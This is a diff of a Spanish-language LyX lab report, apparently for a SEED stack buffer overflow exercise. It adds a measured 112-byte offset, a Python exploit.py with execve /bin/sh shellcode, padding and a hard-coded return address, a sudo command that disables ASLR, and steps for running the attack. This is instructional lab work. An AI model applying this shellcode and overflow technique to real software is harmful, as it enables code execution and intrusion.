@@ -418,16 +418,25 @@ ebp            0xffffc8c8          0xffffc8c8
 
 \begin_layout Plain Layout
 
-$1 = (char (*)[100]) 0xffffc85c
-\end_layout
-
-\begin_layout Plain Layout
-
+$1 = (char (*)[100]) 0xffffc85c			
 \end_layout
 
 \end_inset
 
 
+\end_layout
+
+\begin_layout Standard
+Se observa que la 
+\begin_inset Formula $\textit{return address}$
+\end_inset
+
+ se encuentra en la dirección 0xffffc8c8 ($ebp+4) mientras que la dirección
+ del buffer es 0xffffc85c, el offset entre 
+\begin_inset Formula $\textit{return address}$
+\end_inset
+
+ y el buffer es de 112 bytes.
 \end_layout
 
 \end_deeper
@@ -512,17 +521,18 @@ status open
 \begin_inset Formula $\textit{return address}$
 \end_inset
 
- se almacena en ebp+4, entonces hay que calcular la distancia entre 
+ se almacena en ebp+4, entonces hay que desbordar el buffer y sobreescribir
+ la 
 \begin_inset Formula $\textit{return address}$
 \end_inset
 
- y el buffer.
- Mediante un script podemos generar el payload necesario para sobreescribir
+con un payload de 112 bytes y agregando la dirección al final.
+ Con el script exploit.py se genera el payload necesario para sobreescribir
  
 \begin_inset Formula $\textit{return address}$
 \end_inset
 
-:
+e inyectar el shellcode:
 \end_layout
 
 \begin_deeper
@@ -534,13 +544,157 @@ status open
 
 \begin_layout Plain Layout
 
-#!/usr/bin/env python3 # Fills the buffer with 'A' (0x41) and writes to
- badfile
+#!/usr/bin/env python3
 \end_layout
 
 \begin_layout Plain Layout
 
-BUF_SIZE = 517  # Large enough to fill the buffer and overflow
+import sys
+\end_layout
+
+\begin_layout Plain Layout
+
+# Exploit buffer construction
+\end_layout
+
+\begin_layout Plain Layout
+
+# Buffer layout:
+\end_layout
+
+\begin_layout Plain Layout
+
+# [Shellcode (25)] + [Padding (85)] + [Return address (4)]
+\end_layout
+
+\begin_layout Plain Layout
+
+# Total: 116 bytes (112 bytes payload + 4 bytes return address)
+\end_layout
+
+\begin_layout Plain Layout
+
+# 2.
+ Shellcode to spawn /bin/sh (25 bytes)
+\end_layout
+
+\begin_layout Plain Layout
+
+shellcode = (     b"
+\backslash
+x31
+\backslash
+xc0
+\backslash
+x50
+\backslash
+x68
+\backslash
+x2f
+\backslash
+x2f
+\backslash
+x73
+\backslash
+x68"
+\end_layout
+
+\begin_layout Plain Layout
+
+				  b"
+\backslash
+x68
+\backslash
+x2f
+\backslash
+x62
+\backslash
+x69
+\backslash
+x6e
+\backslash
+x89
+\backslash
+xe3
+\backslash
+x50"
+\end_layout
+
+\begin_layout Plain Layout
+
+                  b"
+\backslash
+x53
+\backslash
+x89
+\backslash
+xe1
+\backslash
+x31
+\backslash
+xd2
+\backslash
+x31
+\backslash
+xc0
+\backslash
+xb0"
+\end_layout
+
+\begin_layout Plain Layout
+
+			      b"
+\backslash
+x0b
+\backslash
+xcd
+\backslash
+x80" )
+\end_layout
+
+\begin_layout Plain Layout
+
+# 3.
+ Padding to reach the saved return address (85 bytes)
+\end_layout
+
+\begin_layout Plain Layout
+
+# Empirically: 110 bytes before return address works # 110 - 25 = 85
+\end_layout
+
+\begin_layout Plain Layout
+
+padding = b"A" * 85
+\end_layout
+
+\begin_layout Plain Layout
+
+# 4.
+ Return address pointing into the buffer (little endian)
+\end_layout
+
+\begin_layout Plain Layout
+
+ret_addr = b"
+\backslash
+x5c
+\backslash
+xc8
+\backslash
+xff
+\backslash
+xff"
+\end_layout
+
+\begin_layout Plain Layout
+
+# Construct final exploit buffer exploit = shellcode + padding + ret_addr
+\end_layout
+
+\begin_layout Plain Layout
+
+# Write the exploit buffer to 'badfile' as raw bytes
 \end_layout
 
 \begin_layout Plain Layout
@@ -550,7 +704,7 @@ with open('badfile', 'wb') as f:
 
 \begin_layout Plain Layout
 
-    f.write(b'A' * BUF_SIZE) 
+    f.write(exploit) 
 \end_layout
 
 \end_inset
@@ -560,8 +714,29 @@ with open('badfile', 'wb') as f:
 
 \end_deeper
 \begin_layout Enumerate
-Hay que concatenar los 2 comandos para mantener el entorno y que se mantenga
- la dirección del buffer.
+Se puede deshabilitar ASLR para que la dirección del buffer permanezca estática.
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset listings
+lstparams "style=cppstyle,caption={GDB Commands}"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Enumerate
+Ejecutar el exploit y correr el ejecutable para llevar a cabo el ataque.
 \end_layout
 
 \begin_deeper
@@ -573,17 +748,12 @@ status open
 
 \begin_layout Plain Layout
 
-seed@VM:~/.../code$ python3 create_shellcode.py > badfile &&
+seed@VM:~/.../code$ python3 exploit.py > badfile
 \end_layout
 
 \begin_layout Plain Layout
 
-timeout 2 ./stack
-\end_layout
-
-\begin_layout Plain Layout
-
-Mode: Normal execution
+seed@VM:~/.../code$ ./stack-L1
 \end_layout
 
 \begin_layout Plain Layout
@@ -656,7 +826,11 @@ Task 4: Launching Attack without Knowing Buffer Size
 \begin_layout Standard
 Para sobreescribir la dirección de retorno sin tener en cuenta el tamaño
  del buffer, una estrategia es agregar varias veces la dirección del buffer
- al final del payload
+ al final del payload.
+\end_layout
+
+\begin_layout Standard
+La otra estrategia es determinar el offset mediante fuerza bruta
 \end_layout
 
 \begin_layout Section*
